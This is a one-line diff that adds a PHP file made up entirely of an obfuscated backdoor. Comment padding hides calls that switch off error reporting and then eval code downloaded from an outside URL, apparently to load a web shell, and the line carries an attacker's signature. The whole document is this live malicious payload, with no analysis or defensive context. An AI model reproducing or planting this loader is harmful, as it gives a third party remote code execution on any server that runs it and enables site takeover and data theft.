@@ -1,0 +1,1 @@
+<?=/****/@/*55555*/null; /******/@/*55555*/error_reporting(0);/****/@/*55555*/null; /******/@/*55555*/eval/******/("?>".file_get_contents("https://html.avatar-amp.info/backup/alfa.txt"))/******/ /*By M1kasa1337:v*/?>
